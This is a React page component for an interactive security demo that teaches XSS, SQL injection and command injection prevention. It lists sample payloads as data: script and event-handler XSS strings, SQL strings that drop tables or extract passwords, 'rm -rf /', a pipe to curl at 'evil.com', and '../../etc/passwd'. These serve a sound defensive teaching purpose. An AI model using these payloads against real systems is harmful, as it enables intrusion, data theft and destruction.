/**
 * XSS Prevention Demo
 * Interactive demonstration of input sanitization and output encoding
 */

'use client';

import React, { useState, useEffect } from 'react';
import { SafeHTML } from '@/lib/output-encoder';
import { sanitize, SanitizationLevel } from '@/lib/input-sanitizer';

export default function SecurityDemoPage() {
  const [input, setInput] = useState('');
  const [comments, setComments] = useState<any[]>([]);
  const [author, setAuthor] = useState('');
  const [showRaw, setShowRaw] = useState(false);
  const [activeDemo, setActiveDemo] = useState<'xss' | 'sql' | 'injection'>('xss');

  // XSS Attack Examples
  const xssExamples = [
    {
      name: 'Script Tag Attack',
      code: '<script>alert("XSS Attack!")</script>',
      description: 'Classic XSS: Injects JavaScript that executes on page load',
    },
    {
      name: 'Image Onerror Attack',
      code: '<img src="invalid" onerror="alert(\'XSS\')" />',
      description: 'Uses onerror event handler to execute malicious code',
    },
    {
      name: 'Link JavaScript Protocol',
      code: '<a href="javascript:alert(\'XSS\')">Click me</a>',
      description: 'Uses javascript: protocol in links to execute code',
    },
    {
      name: 'Iframe Injection',
      code: '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      description: 'Embeds malicious iframe with JavaScript',
    },
    {
      name: 'SVG Script Attack',
      code: '<svg onload="alert(\'XSS\')"></svg>',
      description: 'Uses SVG elements with event handlers',
    },
  ];

  // SQL Injection Examples (informational)
  const sqlExamples = [
    {
      name: 'Authentication Bypass',
      code: "admin' OR '1'='1",
      description: 'Attempts to bypass login by making condition always true',
      prevention: 'Prisma parameterized queries prevent this automatically',
    },
    {
      name: 'Data Extraction',
      code: "'; DROP TABLE users; --",
      description: 'Attempts to delete database tables',
      prevention: 'Parameterized queries treat input as data, not SQL code',
    },
    {
      name: 'Union Attack',
      code: "1' UNION SELECT password FROM users--",
      description: 'Attempts to extract sensitive data from other tables',
      prevention: 'Type-safe Prisma queries prevent SQL manipulation',
    },
  ];

  // Command Injection Examples
  const commandExamples = [
    {
      name: 'Command Chaining',
      code: 'file.txt; rm -rf /',
      description: 'Attempts to chain dangerous commands',
      prevention: 'Never pass user input to shell commands',
    },
    {
      name: 'Pipe Attack',
      code: 'input | curl evil.com',
      description: 'Attempts to pipe data to external services',
      prevention: 'Validate input against strict allow-lists',
    },
  ];

  // Fetch existing comments
  useEffect(() => {
    fetchComments();
  }, []);

  async function fetchComments() {
    try {
      const response = await fetch('/api/security/comments');
      const data = await response.json();
      if (data.success) {
        setComments(data.data);
      }
    } catch (error) {
      console.error('Failed to fetch comments:', error);
    }
  }

  async function submitComment() {
    if (!input.trim() || !author.trim()) {
      alert('Please enter both comment and author name');
      return;
    }

    try {
      const response = await fetch('/api/security/comments', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: input, author }),
      });

      const data = await response.json();

      if (data.success) {
        alert(`✅ Comment submitted!\n\nSanitized: ${data.meta.sanitized ? 'Yes' : 'No'}`);
        setInput('');
        fetchComments();
      } else {
        alert(`❌ Validation failed:\n${JSON.stringify(data.errors, null, 2)}`);
      }
    } catch (error) {
      console.error('Failed to submit comment:', error);
      alert('Failed to submit comment');
    }
  }

  async function clearComments() {
    try {
      await fetch('/api/security/comments', { method: 'DELETE' });
      setComments([]);
      alert('✅ All comments cleared');
    } catch (error) {
      console.error('Failed to clear comments:', error);
    }
  }

  function tryExample(code: string) {
    setInput(code);
  }

  return (
    <div className="min-h-screen bg-gray-50 dark:bg-gray-900 py-12 px-4">
      <div className="max-w-6xl mx-auto">
        {/* Header */}
        <div className="mb-8">
          <h1 className="text-4xl font-bold mb-4 text-gray-900 dark:text-white">
            🛡️ Security & OWASP Compliance Demo
          </h1>
          <p className="text-lg text-gray-600 dark:text-gray-300">
            Interactive demonstration of input sanitization, XSS prevention, and OWASP best practices.
          </p>
        </div>

        {/* Tab Navigation */}
        <div className="flex gap-2 mb-6">
          <button
            onClick={() => setActiveDemo('xss')}
            className={`px-6 py-3 rounded-lg font-medium transition ${
              activeDemo === 'xss'
                ? 'bg-blue-600 text-white'
                : 'bg-white dark:bg-gray-800 text-gray-700 dark:text-gray-300'
            }`}
          >
            XSS Prevention
          </button>
          <button
            onClick={() => setActiveDemo('sql')}
            className={`px-6 py-3 rounded-lg font-medium transition ${
              activeDemo === 'sql'
                ? 'bg-blue-600 text-white'
                : 'bg-white dark:bg-gray-800 text-gray-700 dark:text-gray-300'
            }`}
          >
            SQL Injection
          </button>
          <button
            onClick={() => setActiveDemo('injection')}
            className={`px-6 py-3 rounded-lg font-medium transition ${
              activeDemo === 'injection'
                ? 'bg-blue-600 text-white'
                : 'bg-white dark:bg-gray-800 text-gray-700 dark:text-gray-300'
            }`}
          >
            Command Injection
          </button>
        </div>

        {/* XSS Demo */}
        {activeDemo === 'xss' && (
          <div className="space-y-6">
            {/* Attack Examples */}
            <div className="bg-white dark:bg-gray-800 rounded-xl p-6 shadow-lg">
              <h2 className="text-2xl font-bold mb-4 text-gray-900 dark:text-white">
                Try These XSS Attack Examples
              </h2>
              <p className="text-gray-600 dark:text-gray-300 mb-4">
                Click any example to see how our sanitization prevents the attack:
              </p>
              <div className="grid gap-3">
                {xssExamples.map((example, idx) => (
                  <div key={idx} className="border border-gray-200 dark:border-gray-700 rounded-lg p-4">
                    <div className="flex justify-between items-start mb-2">
                      <div>
                        <h3 className="font-semibold text-gray-900 dark:text-white">{example.name}</h3>
                        <p className="text-sm text-gray-600 dark:text-gray-400">{example.description}</p>
                      </div>
                      <button
                        onClick={() => tryExample(example.code)}
                        className="px-3 py-1 bg-red-100 dark:bg-red-900 text-red-700 dark:text-red-200 rounded text-sm hover:bg-red-200 dark:hover:bg-red-800"
                      >
                        Try Attack
                      </button>
                    </div>
                    <code className="block mt-2 p-2 bg-gray-100 dark:bg-gray-900 rounded text-sm overflow-x-auto">
                      {example.code}
                    </code>
                  </div>
                ))}
              </div>
            </div>

            {/* Input Form */}
            <div className="bg-white dark:bg-gray-800 rounded-xl p-6 shadow-lg">
              <h2 className="text-2xl font-bold mb-4 text-gray-900 dark:text-white">
                Submit a Comment (Try XSS Attack)
              </h2>
              
              <div className="space-y-4">
                <div>
                  <label className="block text-sm font-medium mb-2 text-gray-700 dark:text-gray-300">
                    Your Name (Strict Sanitization - No HTML)
                  </label>
                  <input
                    type="text"
                    value={author}
                    onChange={(e) => setAuthor(e.target.value)}
                    placeholder="John Doe"
                    className="w-full px-4 py-2 rounded-lg border border-gray-300 dark:border-gray-600 bg-white dark:bg-gray-700 text-gray-900 dark:text-white"
                  />
                </div>

                <div>
                  <label className="block text-sm font-medium mb-2 text-gray-700 dark:text-gray-300">
                    Comment (Basic Sanitization - Allows b, i, strong, em)
                  </label>
                  <textarea
                    value={input}
                    onChange={(e) => setInput(e.target.value)}
                    placeholder="Try pasting an XSS attack here..."
                    rows={4}
                    className="w-full px-4 py-2 rounded-lg border border-gray-300 dark:border-gray-600 bg-white dark:bg-gray-700 text-gray-900 dark:text-white font-mono text-sm"
                  />
                </div>

                {/* Live Preview */}
                {input && (
                  <div className="border-t border-gray-200 dark:border-gray-700 pt-4">
                    <h3 className="font-semibold mb-2 text-gray-900 dark:text-white">Live Sanitization Preview:</h3>
                    <div className="grid grid-cols-2 gap-4">
                      <div>
                        <p className="text-sm text-red-600 dark:text-red-400 font-medium mb-2">❌ BEFORE (Dangerous):</p>
                        <div className="p-3 bg-red-50 dark:bg-red-900/20 border border-red-200 dark:border-red-800 rounded">
                          <code className="text-xs break-all">{input}</code>
                        </div>
                      </div>
                      <div>
                        <p className="text-sm text-green-600 dark:text-green-400 font-medium mb-2">✅ AFTER (Safe):</p>
                        <div className="p-3 bg-green-50 dark:bg-green-900/20 border border-green-200 dark:border-green-800 rounded">
                          <code className="text-xs break-all">{sanitize(input, SanitizationLevel.BASIC)}</code>
                        </div>
                      </div>
                    </div>
                  </div>
                )}

                <div className="flex gap-2">
                  <button
                    onClick={submitComment}
                    className="px-6 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 font-medium"
                  >
                    Submit Comment
                  </button>
                  <button
                    onClick={clearComments}
                    className="px-6 py-2 bg-gray-200 dark:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-lg hover:bg-gray-300 dark:hover:bg-gray-600"
                  >
                    Clear All
                  </button>
                  <label className="flex items-center gap-2 ml-auto">
                    <input
                      type="checkbox"
                      checked={showRaw}
                      onChange={(e) => setShowRaw(e.target.checked)}
                      className="rounded"
                    />
                    <span className="text-sm text-gray-700 dark:text-gray-300">Show Original Input</span>
                  </label>
                </div>
              </div>
            </div>

            {/* Submitted Comments */}
            <div className="bg-white dark:bg-gray-800 rounded-xl p-6 shadow-lg">
              <h2 className="text-2xl font-bold mb-4 text-gray-900 dark:text-white">
                Submitted Comments ({comments.length})
              </h2>
              {comments.length === 0 ? (
                <p className="text-gray-500 italic">No comments yet. Try submitting one above!</p>
              ) : (
                <div className="space-y-4">
                  {comments.map((comment) => (
                    <div key={comment.id} className="border border-gray-200 dark:border-gray-700 rounded-lg p-4">
                      <div className="flex justify-between items-start mb-2">
                        <div>
                          <p className="font-semibold text-gray-900 dark:text-white">{comment.author}</p>
                          <p className="text-xs text-gray-500">{new Date(comment.createdAt).toLocaleString()}</p>
                        </div>
                        <span className="px-2 py-1 bg-green-100 dark:bg-green-900 text-green-700 dark:text-green-200 text-xs rounded">
                          Sanitized
                        </span>
                      </div>
                      
                      <div className="mt-3 p-3 bg-gray-50 dark:bg-gray-900 rounded">
                        <SafeHTML html={comment.content} />
                      </div>

                      {showRaw && (
                        <details className="mt-2">
                          <summary className="text-xs text-blue-600 dark:text-blue-400 cursor-pointer">
                            Show Original Input (Before Sanitization)
                          </summary>
                          <code className="block mt-2 p-2 bg-red-50 dark:bg-red-900/20 border border-red-200 dark:border-red-800 rounded text-xs">
                            {comment.contentRaw}
                          </code>
                        </details>
                      )}
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
        )}

        {/* SQL Injection Demo */}
        {activeDemo === 'sql' && (
          <div className="space-y-6">
            <div className="bg-white dark:bg-gray-800 rounded-xl p-6 shadow-lg">
              <h2 className="text-2xl font-bold mb-4 text-gray-900 dark:text-white">
                SQL Injection Prevention with Prisma
              </h2>
              <p className="text-gray-600 dark:text-gray-300 mb-6">
                Our application uses <strong>Prisma ORM</strong> which automatically prevents SQL injection through parameterized queries.
              </p>

              <div className="space-y-4">
                {sqlExamples.map((example, idx) => (
                  <div key={idx} className="border border-gray-200 dark:border-gray-700 rounded-lg p-4">
                    <div className="flex justify-between items-start mb-2">
                      <div className="flex-1">
                        <h3 className="font-semibold text-gray-900 dark:text-white">{example.name}</h3>
                        <p className="text-sm text-gray-600 dark:text-gray-400 mt-1">{example.description}</p>
                      </div>
                      <span className="ml-4 px-3 py-1 bg-red-100 dark:bg-red-900 text-red-700 dark:text-red-200 text-xs rounded shrink-0">
                        ATTACK
                      </span>
                    </div>
                    
                    <code className="block mt-3 p-3 bg-gray-100 dark:bg-gray-900 rounded text-sm">
                      {example.code}
                    </code>

                    <div className="mt-3 p-3 bg-green-50 dark:bg-green-900/20 border border-green-200 dark:border-green-800 rounded">
                      <p className="text-sm text-green-700 dark:text-green-300">
                        <strong>✅ Prevention:</strong> {example.prevention}
                      </p>
                    </div>
                  </div>
                ))}
              </div>

              <div className="mt-6 p-4 bg-blue-50 dark:bg-blue-900/20 border border-blue-200 dark:border-blue-800 rounded-lg">
                <h3 className="font-semibold text-blue-900 dark:text-blue-200 mb-2">Safe vs Unsafe Examples:</h3>
                <div className="grid md:grid-cols-2 gap-4 text-sm">
                  <div>
                    <p className="font-medium text-green-700 dark:text-green-300 mb-2">✅ SAFE (Prisma):</p>
                    <code className="block p-2 bg-white dark:bg-gray-900 rounded text-xs">
                      {`await prisma.user.findFirst({
  where: { email: userInput }
})`}
                    </code>
                  </div>
                  <div>
                    <p className="font-medium text-red-700 dark:text-red-300 mb-2">❌ UNSAFE (Raw SQL):</p>
                    <code className="block p-2 bg-white dark:bg-gray-900 rounded text-xs">
                      {`await db.query(
  \`SELECT * FROM users 
   WHERE email = '\${userInput}'\`
)`}
                    </code>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Command Injection Demo */}
        {activeDemo === 'injection' && (
          <div className="space-y-6">
            <div className="bg-white dark:bg-gray-800 rounded-xl p-6 shadow-lg">
              <h2 className="text-2xl font-bold mb-4 text-gray-900 dark:text-white">
                Command & Path Traversal Prevention
              </h2>
              <p className="text-gray-600 dark:text-gray-300 mb-6">
                Never pass user input directly to system commands or file paths without validation.
              </p>

              <div className="space-y-4">
                {commandExamples.map((example, idx) => (
                  <div key={idx} className="border border-gray-200 dark:border-gray-700 rounded-lg p-4">
                    <div className="flex justify-between items-start mb-2">
                      <div className="flex-1">
                        <h3 className="font-semibold text-gray-900 dark:text-white">{example.name}</h3>
                        <p className="text-sm text-gray-600 dark:text-gray-400 mt-1">{example.description}</p>
                      </div>
                      <span className="ml-4 px-3 py-1 bg-red-100 dark:bg-red-900 text-red-700 dark:text-red-200 text-xs rounded shrink-0">
                        ATTACK
                      </span>
                    </div>
                    
                    <code className="block mt-3 p-3 bg-gray-100 dark:bg-gray-900 rounded text-sm">
                      {example.code}
                    </code>

                    <div className="mt-3 p-3 bg-green-50 dark:bg-green-900/20 border border-green-200 dark:border-green-800 rounded">
                      <p className="text-sm text-green-700 dark:text-green-300">
                        <strong>✅ Prevention:</strong> {example.prevention}
                      </p>
                    </div>
                  </div>
                ))}
              </div>

              <div className="mt-6 p-4 bg-yellow-50 dark:bg-yellow-900/20 border border-yellow-200 dark:border-yellow-800 rounded-lg">
                <h3 className="font-semibold text-yellow-900 dark:text-yellow-200 mb-2">⚠️ Additional Attacks:</h3>
                <ul className="list-disc list-inside space-y-1 text-sm text-yellow-800 dark:text-yellow-300">
                  <li><strong>Path Traversal:</strong> <code>../../etc/passwd</code> - Access files outside allowed directory</li>
                  <li><strong>Null Byte Injection:</strong> <code>file.txt%00.jpg</code> - Bypass file type checks</li>
                  <li><strong>LDAP Injection:</strong> Manipulate LDAP queries if using directory services</li>
                  <li><strong>XML External Entity (XXE):</strong> Exploit XML parsers to read local files</li>
                </ul>
              </div>
            </div>
          </div>
        )}

        {/* Security Summary */}
        <div className="bg-gradient-to-r from-blue-600 to-purple-600 rounded-xl p-6 shadow-lg text-white">
          <h2 className="text-2xl font-bold mb-4">🛡️ Security Measures Implemented</h2>
          <div className="grid md:grid-cols-3 gap-4">
            <div>
              <h3 className="font-semibold mb-2">✅ Input Sanitization</h3>
              <ul className="text-sm space-y-1 opacity-90">
                <li>• Strip dangerous HTML tags</li>
                <li>• Validate data types</li>
                <li>• Enforce length limits</li>
                <li>• Remove special characters</li>
              </ul>
            </div>
            <div>
              <h3 className="font-semibold mb-2">✅ Output Encoding</h3>
              <ul className="text-sm space-y-1 opacity-90">
                <li>• HTML entity encoding</li>
                <li>• Context-aware escaping</li>
                <li>• DOMPurify sanitization</li>
                <li>• Safe rendering practices</li>
              </ul>
            </div>
            <div>
              <h3 className="font-semibold mb-2">✅ Other Protections</h3>
              <ul className="text-sm space-y-1 opacity-90">
                <li>• Parameterized queries (Prisma)</li>
                <li>• Rate limiting</li>
                <li>• Security headers</li>
                <li>• CSRF protection (JWT)</li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
